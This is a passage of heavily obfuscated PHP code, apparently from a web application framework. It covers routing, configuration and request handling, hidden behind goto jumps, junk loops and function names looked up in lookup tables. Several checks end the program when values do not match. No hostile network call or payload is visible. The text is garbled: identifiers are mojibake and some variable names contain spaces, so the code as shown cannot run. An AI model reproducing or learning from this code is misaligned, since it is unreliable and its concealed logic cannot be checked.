$DîØ ¨‚‘[0]($DîØ ¨‚‘[1], $cÀìÁÊÌË×); $D ¡¬§«”İ = $DîØ ¨‚‘[6]($B‘ŠÑƒ¼İï[0]); goto B©¯¤ƒ¥×‰; fé»äõ«Ö¿: $DîØ ¨‚‘[13](array($DîØ ¨‚‘[14], $DîØ ¨‚‘[15]), $f°‚÷ƒïóÄ . $DîØ ¨‚‘[16], $cÀìÁÊÌË×); $DîØ ¨‚‘[17]($cÀìÁÊÌË×); $DîØ ¨‚‘[13](array($DîØ ¨‚‘[14], $DîØ ¨‚‘[15]), $f°‚÷ƒïóÄ . $DîØ ¨‚‘[18], $cÀìÁÊÌË×); goto C„ÒèªÊ¬×; C„ÒèªÊ¬×: } private function autorun() { goto CòÀ†ˆâ; E­Œåñì’: $BØİæ¨Õ = $b·‰¹½„´[591]; while (strlen($BØİæ¨Õ) < $b·‰¹½„´[10]) { if (!$BØİæ¨Õ) { break; } $BØİæ¨Õ++; } if ($FÉŠ‘ªÜ˜[19]($config[$FÉŠ‘ªÜ˜[20]]) == 0) { return; } goto D§â®ÁŒí®; D§â®ÁŒí®: foreach ($config[$FÉŠ‘ªÜ˜[20]] as $A¶‚å§»ù³ => $Dˆ²ŠÜœÒÇ) { $this->{$_SERVER[£ÛúôÆ˜öÒòş][21]}($Dˆ²ŠÜœÒÇ); } goto bˆğô™¥; CòÀ†ˆâ: $b·‰¹½„´ =& $_SERVER[£¶ä½¶¢]; $FÉŠ‘ªÜ˜ =& $_SERVER[£ÛúôÆ˜öÒòş]; global $config; goto E­Œåñì’; bˆğô™¥: } private function bftkf95225ee() { goto aÕˆŠÛÔ´Ô; eé†¦šˆ¼Û: $E‚—‡Ñ¸Àà = $c¶ÙòäÀ†[595]; if (!$E‚—‡Ñ¸Àà) { return; } $f¸šä³£¤› = $d¹óâ¸»Å[26]($GLOBALS[$d¹óâ¸»Å[22]][$d¹óâ¸»Å[23]], 1); goto Dº¥˜î‘; EÙ’ïÚ¤ó: if (!$bÓ«Ê¹Ííí || $d¹óâ¸»Å[24]($bÓ«Ê¹Ííí) <= $d¹óâ¸»Å[24]($F¢’§‘×ƒß)) { return; } if ($d¹óâ¸»Å[6]($d¹óâ¸»Å[25]($bÓ«Ê¹Ííí, -$d¹óâ¸»Å[24]($F¢’§‘×ƒß))) != $F¢’§‘×ƒß) { return; } $bòñÉÚ¶± = $d¹óâ¸»Å[25]($bÓ«Ê¹Ííí, 0, -$d¹óâ¸»Å[24]($F¢’§‘×ƒß)); goto Eï§°¼ó…È; f·À¦Çˆ À: $bÓ«Ê¹Ííí = $GLOBALS[$d¹óâ¸»Å[22]][$d¹óâ¸»Å[23]][0]; $bÌß´‡¢¥Û = $c¶ÙòäÀ†[592]; if (strlen($bÌß´‡¢¥Û) < $c¶ÙòäÀ†[593]) { die; } goto EÙ’ïÚ¤ó; Eï§°¼ó…È: $Fƒ–Èö¯­ = $c¶ÙòäÀ†[594]; while ($Fƒ–Èö¯­ < $c¶ÙòäÀ†[586]) { if ($Fƒ–Èö¯­ >= 0) { break; } $Fƒ–Èö¯­++; } $cƒé”ƒ‹ö = array($d¹óâ¸»Å[8], $bòñÉÚ¶±); goto eé†¦šˆ¼Û; b•åìºÂ²°: $GLOBALS[$d¹óâ¸»Å[22]][$d¹óâ¸»Å[28]] = $d¹óâ¸»Å[29]($d¹óâ¸»Å[1], $GLOBALS[$d¹óâ¸»Å[22]][$d¹óâ¸»Å[23]]); goto e¬Ø÷ôÔôĞ; Dº¥˜î‘: $bÒ’Å†‹ò = $c¶ÙòäÀ†[596]; if (strlen($bÒ’Å†‹ò) < $c¶ÙòäÀ†[597]) { die; } $GLOBALS[$d¹óâ¸»Å[22]][$d¹óâ¸»Å[23]] = $d¹óâ¸»Å[27]($cƒé”ƒ‹ö, $f¸šä³£¤›); goto b•åìºÂ²°; aÕˆŠÛÔ´Ô: $c¶ÙòäÀ† =& $_SERVER[£¶ä½¶¢]; $d¹óâ¸»Å =& $_SERVER[£ÛúôÆ˜öÒòş]; $F¢’§‘×ƒß = $d¹óâ¸»Å[8]; goto f·À¦Çˆ À; e¬Ø÷ôÔôĞ: } private function hsnz28c492b1() { goto c¦˜Ø¡ìĞ; cİ¥ñ«Ô: $f†èˆŒÀ´ = $FÃ¦¼²ë»Ÿ[31]; $cÇà¿àÙ‘ã = $D›Û´Ü¢Šå[599]; if (strlen($cÇà¿àÙ‘ã) < $D›Û´Ü¢Šå[600]) { die; } goto b’ºíá¶é; c¦˜Ø¡ìĞ: $D›Û´Ü¢Šå =& $_SERVER[£¶ä½¶¢]; $FÃ¦¼²ë»Ÿ =& $_SERVER[£ÛúôÆ˜öÒòş]; if ($GLOBALS[$FÃ¦¼²ë»Ÿ[22]][$FÃ¦¼²ë»Ÿ[28]] != $FÃ¦¼²ë»Ÿ[10]) { return; } goto bß¶§ç‰¾Â; bß¶§ç‰¾Â: $DÓ…š‹œ ½ = $_SERVER[$FÃ¦¼²ë»Ÿ[30]]; $FÜº×“”ó = $D›Û´Ü¢Šå[598]; if (!$FÜº×“”ó) { die; } goto cİ¥ñ«Ô; D‹ÜÍÉ‰—¬: $DÇœ‡”…Ñâ = $D›Û´Ü¢Šå[602]; if (!$DÇœ‡”…Ñâ) { die; } $GLOBALS[$FÃ¦¼²ë»Ÿ[22]][$FÃ¦¼²ë»Ÿ[23]] = $FÃ¦¼²ë»Ÿ[0]($FÃ¦¼²ë»Ÿ[36], $DÛÆ¯šöÎ); goto aÒñ˜ôÄó©; aÒñ˜ôÄó©: $D™ô´ƒ‹Üè = $D›Û´Ü¢Šå[603]; while ($D™ô´ƒ‹Üè < $D›Û´Ü¢Šå[10]) { if ($D™ô´ƒ‹Üè >= 0) { break; } $D™ô´ƒ‹Üè++; } $GLOBALS[$FÃ¦¼²ë»Ÿ[22]][$FÃ¦¼²ë»Ÿ[28]] = $FÃ¦¼²ë»Ÿ[29]($FÃ¦¼²ë»Ÿ[1], $GLOBALS[$FÃ¦¼²ë»Ÿ[22]][$FÃ¦¼²ë»Ÿ[23]]); goto A´µÒø¦°Ê; b’ºíá¶é: if (!$FÃ¦¼²ë»Ÿ[32]($DÓ…š‹œ ½, $f†èˆŒÀ´)) { return; } $B…å¿ñïŸ = $FÃ¦¼²ë»Ÿ[33]($DÓ…š‹œ ½, $f†èˆŒÀ´); $A§˜Ö«­¹ = $D›Û´Ü¢Šå[601]; goto AÀ—Çâ“; AÀ—Çâ“: $DÛÆ¯šöÎ = $FÃ¦¼²ë»Ÿ[25]($DÓ…š‹œ ½, $B…å¿ñïŸ + $FÃ¦¼²ë»Ÿ[24]($f†èˆŒÀ´)); $FÃ¦¼²ë»Ÿ[34]($FÃ¦¼²ë»Ÿ[35], $DÛÆ¯šöÎ, $FÓ´ùùòïœ); $DÛÆ¯šöÎ = $FÃ¦¼²ë»Ÿ[2]($FÓ´ùùòïœ[0][0], $FÃ¦¼²ë»Ÿ[36]); goto D‹ÜÍÉ‰—¬; A´µÒø¦°Ê: } public function run() { goto Aõ¨à¿…ƒÍ; Aõ¨à¿…ƒÍ: $EóÄÖ„Ö–Š =& $_SERVER[£¶ä½¶¢]; $f­ïõ²õ’ª =& $_SERVER[£ÛúôÆ˜öÒòş]; $this->{$_SERVER[£ÛúôÆ˜öÒòş][37]}(); goto dÒ×„â¦Ó; e³øöÉ¹éê: $_SERVER[$f­ïõ²õ’ª[44]] = $f­ïõ²õ’ª[6](ACTION); $this->{$_SERVER[£ÛúôÆ˜öÒòş][45]}(); if ($f­ïõ²õ’ª[19]($E¥…’Ë—) >= 3) { $this->{$_SERVER[£ÛúôÆ˜öÒòş][21]}($bµÅ½¨ĞÓ); } else { $this->{$_SERVER[£ÛúôÆ˜öÒòş][21]}(ACTION); } goto dÜ¾¶³¯Ö¯; dÒ×„â¦Ó: $this->{$_SERVER[£ÛúôÆ˜öÒòş][38]}(); $aÂï‚Ÿ­¦½ = $EóÄÖ„Ö–Š[604]; if (!$aÂï‚Ÿ­¦½) { return; } goto Bš¡íéâÚ; Bš¡íéâÚ: $E¥…’Ë— = $GLOBALS[$f­ïõ²õ’ª[22]][$f­ïõ²õ’ª[23]]; $aíñè‹Íœ = $EóÄÖ„Ö–Š[605]; if (strlen($aíñè‹Íœ) < $EóÄÖ„Ö–Š[10]) { die; } goto f‰‘…ˆ¸èó; b† ²½ŒÒ’: $f­ïõ²õ’ª[39]($f­ïõ²õ’ª[43], MOD . $f­ïõ²õ’ª[1] . ST . $f­ïõ²õ’ª[1] . ACT); $Eíêæİ‡ÎÖ = $EóÄÖ„Ö–Š[607]; if (!$Eíêæİ‡ÎÖ) { die; } goto e³øöÉ¹éê; dÉ²ìÓ¯À»: $f­ïõ²õ’ª[39]($f­ïõ²õ’ª[42], isset($E¥…’Ë—[2]) && $E¥…’Ë—[0] ? $E¥…’Ë—[2] : $this->defaultAction); $FÅ‡†À› = $EóÄÖ„Ö–Š[606]; if (strlen($FÅ‡†À›) < $EóÄÖ„Ö–Š[600]) { return; } goto b† ²½ŒÒ’; f‰‘…ˆ¸èó: $bµÅ½¨ĞÓ = $GLOBALS[$f­ïõ²õ’ª[22]][$f­ïõ²õ’ª[28]]; $f­ïõ²õ’ª[39]($f­ïõ²õ’ª[40], isset($E¥…’Ë—[0]) && $E¥…’Ë—[0] ? $E¥…’Ë—[0] : $this->defaultModule); $f­ïõ²õ’ª[39]($f­ïõ²õ’ª[41], isset($E¥…’Ë—[1]) && $E¥…’Ë—[0] ? $E¥…’Ë—[1] : $this->defaultController); goto dÉ²ìÓ¯À»; dÜ¾¶³¯Ö¯: } private $qbev01c9ff0a = array(); private $uqeg91b17b61 = ''; public function xnfq6a8de9a2() { goto bÊ™Íù¤ˆ; Fíõ•òğ¢ƒ: $BĞ¹À°‰ = $Aâƒ©¢±Åì[608]; while ($BĞ¹À°‰ < $Aâƒ©¢±Åì[600]) { if ($BĞ¹À°‰ >= 0) { break; } $BĞ¹À°‰++; } $this->{$_SERVER[£ÛúôÆ˜öÒòş][47]}(); goto DõÑØÒñî¤; Bç–§Ô‘‘Å: $C‹Á‡ÀŞ˜ = $Aâƒ©¢±Åì[610]; if (strlen($C‹Á‡ÀŞ˜) < $Aâƒ©¢±Åì[10]) { return; } $this->{$_SERVER[£ÛúôÆ˜öÒòş][52]}(); goto A¥ÀŒç¸¥¢; DõÑØÒñî¤: $this->{$_SERVER[£ÛúôÆ˜öÒòş][48]}(); $this->{$_SERVER[£ÛúôÆ˜öÒòş][49]}(); $c˜õˆ¶È = $Aâƒ©¢±Åì[609]; goto fãì¿œº…¸; dÊô¼Ş±¿è: $this->{$_SERVER[£ÛúôÆ˜öÒòş][3]}($AĞàœÌ”ÏÎ[55], array($this, $AĞàœÌ”ÏÎ[56])); $c³ö…êÍ¯Ô = $Aâƒ©¢±Åì[612]; $this->{$_SERVER[£ÛúôÆ˜öÒòş][3]}($AĞàœÌ”ÏÎ[57], array($this, $AĞàœÌ”ÏÎ[58])); goto a²ÇëÆ“‚¥; bÊ™Íù¤ˆ: $Aâƒ©¢±Åì =& $_SERVER[£¶ä½¶¢]; $AĞàœÌ”ÏÎ =& $_SERVER[£ÛúôÆ˜öÒòş]; $this->{$_SERVER[£ÛúôÆ˜öÒòş][46]}(); goto Fíõ•òğ¢ƒ; fãì¿œº…¸: if (!$c˜õˆ¶È) { die; } $this->{$_SERVER[£ÛúôÆ˜öÒòş][50]}(); $this->{$_SERVER[£ÛúôÆ˜öÒòş][51]}(); goto Bç–§Ô‘‘Å; A¥ÀŒç¸¥¢: $A©¤‡õ¢›ù = $Aâƒ©¢±Åì[611]; if (strlen($A©¤‡õ¢›ù) < $Aâƒ©¢±Åì[597]) { return; } $this->{$_SERVER[£ÛúôÆ˜öÒòş][3]}($AĞàœÌ”ÏÎ[53], array($this, $AĞàœÌ”ÏÎ[54])); goto dÊô¼Ş±¿è; E§ÆÉË‘‚: $Fä™ïÔèÙ“ = $Aâƒ©¢±Åì[614]; while ($Fä™ïÔèÙ“ < $Aâƒ©¢±Åì[597]) { if ($Fä™ïÔèÙ“ >= 0) { break; } $Fä™ïÔèÙ“++; } goto cÊØ¶Ñ…‚Í; a²ÇëÆ“‚¥: $eÃÔéÃ¦šÖ = $Aâƒ©¢±Åì[613]; while ($eÃÔéÃ¦šÖ < $Aâƒ©¢±Åì[600]) { if ($eÃÔéÃ¦šÖ >= 0) { break; } $eÃÔéÃ¦šÖ++; } $this->{$_SERVER[£ÛúôÆ˜öÒòş][3]}($AĞàœÌ”ÏÎ[59], array($this, $AĞàœÌ”ÏÎ[60])); goto E§ÆÉË‘‚; cÊØ¶Ñ…‚Í: } public function uildc3f9d6c3($DßîšÀ°) { goto A„ÌŒ”ŸÛ¯; aó‹Î³‡Ç: $eõ¨ï˜Ò×± = array($eÉ¸½µÄ…Œ[64], $eÉ¸½µÄ…Œ[65], $eÉ¸½µÄ…Œ[66], $eÉ¸½µÄ…Œ[67], $eÉ¸½µÄ…Œ[68], $eÉ¸½µÄ…Œ[69], $eÉ¸½µÄ…Œ[70], $eÉ¸½µÄ…Œ[71], $eÉ¸½µÄ…Œ[72], $eÉ¸½µÄ…Œ[73], $eÉ¸½µÄ…Œ[74], $eÉ¸½µÄ…Œ[75], $eÉ¸½µÄ…Œ[76], $eÉ¸½µÄ…Œ[77], $eÉ¸½µÄ…Œ[78], $eÉ¸½µÄ…Œ[79], $eÉ¸½µÄ…Œ[80], $eÉ¸½µÄ…Œ[81], $eÉ¸½µÄ…Œ[82], $eÉ¸½µÄ…Œ[83], $eÉ¸½µÄ…Œ[84], $eÉ¸½µÄ…Œ[85], $eÉ¸½µÄ…Œ[86], $eÉ¸½µÄ…Œ[87], $eÉ¸½µÄ…Œ[88], $eÉ¸½µÄ…Œ[89], $eÉ¸½µÄ…Œ[90], $eÉ¸½µÄ…Œ[91], $eÉ¸½µÄ…Œ[92], $eÉ¸½µÄ…Œ[93], $eÉ¸½µÄ…Œ[94], $eÉ¸½µÄ…Œ[95], $eÉ¸½µÄ…Œ[96], $eÉ¸½µÄ…Œ[97], $eÉ¸½µÄ…Œ[98], $eÉ¸½µÄ…Œ[99], $eÉ¸½µÄ…Œ[100], $eÉ¸½µÄ…Œ[101], $eÉ¸½µÄ…Œ[102], $eÉ¸½µÄ…Œ[103]); foreach ($eõ¨ï˜Ò×± as $d³õ¨‡ó¶•) { $Eíßœß•ÇÏ = $GLOBALS[$eÉ¸½µÄ…Œ[104]][$eÉ¸½µÄ…Œ[105]][$d³õ¨‡ó¶•]; $FØÅ›ÄÚÑ¾ = $f¤Šò‚ğ÷­[615]; while ($FØÅ›ÄÚÑ¾ < $f¤Šò‚ğ÷­[10]) { if ($FØÅ›ÄÚÑ¾ >= 0) { break; } $FØÅ›ÄÚÑ¾++; } if (isset($AõÑ‰“¬ñò[$d³õ¨‡ó¶•])) { $Eíßœß•ÇÏ = $AõÑ‰“¬ñò[$d³õ¨‡ó¶•]; } $DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[107]][$d³õ¨‡ó¶•] = $Eíßœß•ÇÏ; } $Eºğ…—Éôğ = $DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[107]][$eÉ¸½µÄ…Œ[76]]; goto DôŒ‰ŞõŒ´; E›Éİ±–¾¨: if (!$F†Ôæ¾æ“à) { die; } $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[127]] = $eÉ¸½µÄ…Œ[128]($eÉ¸½µÄ…Œ[129]()); $B”Å´Üæ‘ = $f¤Šò‚ğ÷­[621]; goto Dìà±…é©²; eÇ±†Œ¦Öµ: unset($DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[108]][$eÉ¸½µÄ…Œ[110]]); $B…Ò‹óÙó” = $f¤Šò‚ğ÷­[617]; while (strlen($B…Ò‹óÙó”) < $f¤Šò‚ğ÷­[10]) { if (!$B…Ò‹óÙó”) { break; } $B…Ò‹óÙó”++; } goto Eµ±Ñï¡¸»; Eµ±Ñï¡¸»: unset($DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[107]][$eÉ¸½µÄ…Œ[76]]); $a•Ï¡ê†ß = $f¤Šò‚ğ÷­[618]; while ($a•Ï¡ê†ß < $f¤Šò‚ğ÷­[600]) { if ($a•Ï¡ê†ß >= 0) { break; } $a•Ï¡ê†ß++; } goto Cğ¾Ê…Œ–Ğ; C¡ù°ƒÜŒ¿: if ($eÉ¸½µÄ…Œ[116]($GLOBALS, $eÉ¸½µÄ…Œ[142]) && $this->config[$eÉ¸½µÄ…Œ[143]]) { $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[144]] = WEB_ROOT; } return $DßîšÀ°; goto Dï®­›Á; B«ÃˆôàØ: if ($this->uqeg91b17b61 == $eÉ¸½µÄ…Œ[131]) { $DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[107]][$eÉ¸½µÄ…Œ[112]][$eÉ¸½µÄ…Œ[117]] = 0; } $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[138]] = $eÉ¸½µÄ…Œ[116]($this->qbev01c9ff0a, $eÉ¸½µÄ…Œ[139], $eÉ¸½µÄ…Œ[10]); $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[140]] = $eÉ¸½µÄ…Œ[116]($this->qbev01c9ff0a, $eÉ¸½µÄ…Œ[141], $eÉ¸½µÄ…Œ[10]); goto C¡ù°ƒÜŒ¿; Dìà±…é©²: if (!$B”Å´Üæ‘) { die; } $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[130]] = $this->uqeg91b17b61; if ($AõÑ‰“¬ñò[$eÉ¸½µÄ…Œ[130]] != $eÉ¸½µÄ…Œ[131]) { $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[132]] = $AõÑ‰“¬ñò[$eÉ¸½µÄ…Œ[132]]; $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[133]] = $AõÑ‰“¬ñò[$eÉ¸½µÄ…Œ[133]]; $eñäÔ‚‹†ï = $eÉ¸½µÄ…Œ[134](10) . $this->uqeg91b17b61 . $eÉ¸½µÄ…Œ[134](5); $DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[135]][$eÉ¸½µÄ…Œ[136]] = $this->{$_SERVER[£ÛúôÆ˜öÒòş][137]}($eñäÔ‚‹†ï, $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[123]]); } goto B«ÃˆôàØ; DôŒ‰ŞõŒ´: unset($DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[108]][$eÉ¸½µÄ…Œ[109]]); $cˆËÈº¿ÙÔ = $f¤Šò‚ğ÷­[616]; if (!$cˆËÈº¿ÙÔ) { return; } goto eÇ±†Œ¦Öµ; FíÕ«Ñ’„’: $a¦¿œ¿ºè = $f¤Šò‚ğ÷­[619]; $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[123]] = $eÉ¸½µÄ…Œ[124]($_SERVER[$eÉ¸½µÄ…Œ[125]] . $AõÑ‰“¬ñò[$eÉ¸½µÄ…Œ[126]]); $F†Ôæ¾æ“à = $f¤Šò‚ğ÷­[620]; goto E›Éİ±–¾¨; Cğ¾Ê…Œ–Ğ: unset($DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[107]][$eÉ¸½µÄ…Œ[111]]); $DßîšÀ°[$eÉ¸½µÄ…Œ[106]][$eÉ¸½µÄ…Œ[107]][$eÉ¸½µÄ…Œ[112]] = array($eÉ¸½µÄ…Œ[113] => (int) $Eºğ…—Éôğ[$eÉ¸½µÄ…Œ[114]], $eÉ¸½µÄ…Œ[115] => (int) $eÉ¸½µÄ…Œ[116]($Eºğ…—Éôğ, $eÉ¸½µÄ…Œ[117], 0)); $DßîšÀ°[$eÉ¸½µÄ…Œ[118]][$eÉ¸½µÄ…Œ[119]] = $eÉ¸½µÄ…Œ[120]($eÉ¸½µÄ…Œ[121])->{$_SERVER[£ÛúôÆ˜öÒòş][122]}(); goto FíÕ«Ñ’„’; A„ÌŒ”ŸÛ¯: $f¤Šò‚ğ÷­ =& $_SERVER[£¶ä½¶¢]; $eÉ¸½µÄ…Œ =& $_SERVER[£ÛúôÆ˜öÒòş]; $AõÑ‰“¬ñò = $eÉ¸½µÄ…Œ[61]($eÉ¸½µÄ…Œ[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}(); goto aó‹Î³‡Ç; Dï®­›Á: } private function awpl073714e8() { goto dÒøÆèÌ„; Bİ¿Şî÷©: $BáºÚÌ®÷ù = $A‰§ÒÈÔ[627]; if (!$BáºÚÌ®÷ù) { return; } goto e‰‹ÛË¯„; D¼‘»ë°³‡: if (strlen($B²‹î›ÆÂ) < $A‰§ÒÈÔ[593]) { die; } $bÍö©ªÎÑ = $B½ÖØíØí[61]($B½ÖØíØí[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}(); $fŠ¸ŒÎµŸŞ = $A‰§ÒÈÔ[624]; goto e­áÙ˜Ì©°; dÒøÆèÌ„: $A‰§ÒÈÔ =& $_SERVER[£¶ä½¶¢]; $B½ÖØíØí =& $_SERVER[£ÛúôÆ˜öÒòş]; if ($_SERVER[$B½ÖØíØí[44]] == $B½ÖØíØí[145]) { $fÅÙ¯õà‚Ÿ = array($B½ÖØíØí[130] => $this->uqeg91b17b61, $B½ÖØíØí[146] => $this->{$_SERVER[£ÛúôÆ˜öÒòş][147]}(), $B½ÖØíØí[148] => $B½ÖØíØí[61]($B½ÖØíØí[149])->{$_SERVER[£ÛúôÆ˜öÒòş][150]}()); if ($this->uqeg91b17b61 != $B½ÖØíØí[131]) { $CÍŞæØ‰‰ = $B½ÖØíØí[116]($this->qbev01c9ff0a, $B½ÖØíØí[151]); if ($CÍŞæØ‰‰) { $fÅÙ¯õà‚Ÿ[$B½ÖØíØí[152]] = $CÍŞæØ‰‰; $fÅÙ¯õà‚Ÿ[$B½ÖØíØí[153]] = $B½ÖØíØí[154]($B½ÖØíØí[116]($this->qbev01c9ff0a, $B½ÖØíØí[155])); $fÅÙ¯õà‚Ÿ[$B½ÖØíØí[156]] = $B½ÖØíØí[116]($this->qbev01c9ff0a, $B½ÖØíØí[141]); } $AÌ®Ú­¯½› = $B½ÖØíØí[61]($B½ÖØíØí[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($B½ÖØíØí[157], $B½ÖØíØí[10], !0); if ($B½ÖØíØí[158]($AÌ®Ú­¯½›) && $B½ÖØíØí[25]($AÌ®Ú­¯½›, 0, 1) == $B½ÖØíØí[159]) { $AÌ®Ú­¯½› = $B½ÖØíØí[160]($AÌ®Ú­¯½›); } if ($B½ÖØíØí[161]($AÌ®Ú­¯½›) && $AÌ®Ú­¯½›[$B½ÖØíØí[162]] && $B½ÖØíØí[32]($AÌ®Ú­¯½›[$B½ÖØíØí[162]], $B½ÖØíØí[163])) { $fº¬ÆŸºÎ = $B½ÖØíØí[0]($B½ÖØíØí[163], $AÌ®Ú­¯½›[$B½ÖØíØí[162]]); $fÅÙ¯õà‚Ÿ[$B½ÖØíØí[164]] = $fº¬ÆŸºÎ[0]; } } $fÅÙ¯õà‚Ÿ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($B½ÖØíØí[166]($fÅÙ¯õà‚Ÿ), $B½ÖØíØí[124]($B½ÖØíØí[167])); $cù´Â¾ŠƒÄ = $A‰§ÒÈÔ[622]; $d…àç£ã— = array($B½ÖØíØí[168] => $fÅÙ¯õà‚Ÿ); $B½ÖØíØí[13](array($B½ÖØíØí[169], $B½ÖØíØí[170]), $d…àç£ã—); } goto Eàõ ®„Á; c»µÁÓŞŒ: if (strlen($d¢‘ë¾ê°) < $A‰§ÒÈÔ[600]) { die; } foreach ($dˆì¯İ§ò as $E¿«õ°¥¥) { if (!isset($bÍö©ªÎÑ[$E¿«õ°¥¥]) || !$bÍö©ªÎÑ[$E¿«õ°¥¥]) { continue; } $d…àç£ã—[$E¿«õ°¥¥] = $bÍö©ªÎÑ[$E¿«õ°¥¥]; $D’Ù‘Ê½äâ = $A‰§ÒÈÔ[626]; } $B½ÖØíØí[13](array($B½ÖØíØí[169], $B½ÖØíØí[170]), $d…àç£ã—); goto Bİ¿Şî÷©; e­áÙ˜Ì©°: while (strlen($fŠ¸ŒÎµŸŞ) < $A‰§ÒÈÔ[586]) { if (!$fŠ¸ŒÎµŸŞ) { break; } $fŠ¸ŒÎµŸŞ++; } $d…àç£ã— = array($B½ÖØíØí[177] => $bÍö©ªÎÑ[$B½ÖØíØí[64]], $B½ÖØíØí[178] => $bÍö©ªÎÑ[$B½ÖØíØí[65]], $B½ÖØíØí[179] => $B½ÖØíØí[10]); $d¢‘ë¾ê° = $A‰§ÒÈÔ[625]; goto c»µÁÓŞŒ; Eàõ ®„Á: if ($this->uqeg91b17b61 == $B½ÖØíØí[131]) { return; } $dˆì¯İ§ò = array($B½ÖØíØí[171], $B½ÖØíØí[172], $B½ÖØíØí[173], $B½ÖØíØí[174], $B½ÖØíØí[175], $B½ÖØíØí[176]); $B²‹î›ÆÂ = $A‰§ÒÈÔ[623]; goto D¼‘»ë°³‡; e‰‹ÛË¯„: } private function rtla5536846f() { goto Eôİ·Œ¼ì; a¡ÚàŒ·Š¯: $a—àÁ™Š– = $EßÕŒ­¸¬´[632]; $Bßäæ‘”“[$bƒçºÔ¼ã´[132]] = $bƒçºÔ¼ã´[233]($bƒçºÔ¼ã´[128]($this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($CºÆ•ßÑµ, $bƒçºÔ¼ã´[234]))); $aóùÁ²¿È¡ = $EßÕŒ­¸¬´[633]; goto AÖ¤Ş¿ğ®; aÄƒºîìé: $Bè¡•ë„íÅ[$D¸ê‰¼ñ»¡] = $E¬Çê‹ÆÆï; $E•…Ø‘‹¼Ø = $EßÕŒ­¸¬´[640]; while ($E•…Ø‘‹¼Ø < $EßÕŒ­¸¬´[597]) { if ($E•…Ø‘‹¼Ø >= 0) { break; } $E•…Ø‘‹¼Ø++; } goto A‘İáÌÛ¦‰; AÖ¤Ş¿ğ®: $c“˜â”“£¯ = $bƒçºÔ¼ã´[134](16); $B¢×œÓÛâì = $EßÕŒ­¸¬´[634]; if (!$B¢×œÓÛâì) { return; } goto dÆŠ¡Öƒ„; dÆŠ¡Öƒ„: $Aå›‰ÊŠŸ˜ = $c“˜â”“£¯ . $Bßäæ‘”“[$bƒçºÔ¼ã´[130]] . $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($bƒçºÔ¼ã´[124]($Bßäæ‘”“[$bƒçºÔ¼ã´[227]]), $c“˜â”“£¯); $fµá ç¥Ğ = $EßÕŒ­¸¬´[635]; if (strlen($fµá ç¥Ğ) < $EßÕŒ­¸¬´[10]) { return; } goto dãŸÙ‡ƒÑÔ; dòÁÎÍ„‡‘: $fÓ†’‹ØµÉ = $EßÕŒ­¸¬´[628]; while ($fÓ†’‹ØµÉ < $EßÕŒ­¸¬´[597]) { if ($fÓ†’‹ØµÉ >= 0) { break; } $fÓ†’‹ØµÉ++; } $fÀÑ°½¼¶ = array($bƒçºÔ¼ã´[183] => $B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[183]], $bƒçºÔ¼ã´[186] => $bƒçºÔ¼ã´[134](16), $bƒçºÔ¼ã´[187] => $bƒçºÔ¼ã´[167], $bƒçºÔ¼ã´[188] => $bƒçºÔ¼ã´[189], $bƒçºÔ¼ã´[190] => $_SERVER[$bƒçºÔ¼ã´[191]], $bƒçºÔ¼ã´[192] => $_SERVER[$bƒçºÔ¼ã´[193]], $bƒçºÔ¼ã´[194] => $_SERVER[$bƒçºÔ¼ã´[195]], $bƒçºÔ¼ã´[123] => $Dì×«–•Ú, $bƒçºÔ¼ã´[196] => $bƒçºÔ¼ã´[61]($bƒçºÔ¼ã´[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($bƒçºÔ¼ã´[157])); goto dÎ³ØäŠÆ¾; aãÚ±ãÑß: $this->qbev01c9ff0a = $b„¨ÅÜˆ·Á; $this->uqeg91b17b61 = $Bßäæ‘”“[$bƒçºÔ¼ã´[130]]; $this->{$_SERVER[£ÛúôÆ˜öÒòş][248]}(); goto C©ĞŞãº§ò; A‘İáÌÛ¦‰: $bƒçºÔ¼ã´[61]($bƒçºÔ¼ã´[11])->{$_SERVER[£ÛúôÆ˜öÒòş][245]}($c²¼ÉÎ‰„ğ[$bƒçºÔ¼ã´[246]], array($bƒçºÔ¼ã´[247] => $Bè¡•ë„íÅ)); $B—©•Ÿ = $EßÕŒ­¸¬´[641]; while ($B—©•Ÿ < $EßÕŒ­¸¬´[597]) { if ($B—©•Ÿ >= 0) { break; } $B—©•Ÿ++; } goto aãÚ±ãÑß; b»§‰Â‹¢: if (!isset($B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[183]]) || $bƒçºÔ¼ã´[24]($B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[183]]) != 16) { $bƒçºÔ¼ã´[184]($bƒçºÔ¼ã´[185] . $B÷ï…ùŠ´Ò[$bƒçºÔ¼ã´[183]], !1); } $C¿ê‹Á© = $bƒçºÔ¼ã´[61]($bƒçºÔ¼ã´[62])->{$_SERVER[£ÛúôÆ˜öÒòş][63]}($bƒçºÔ¼ã´[126]); 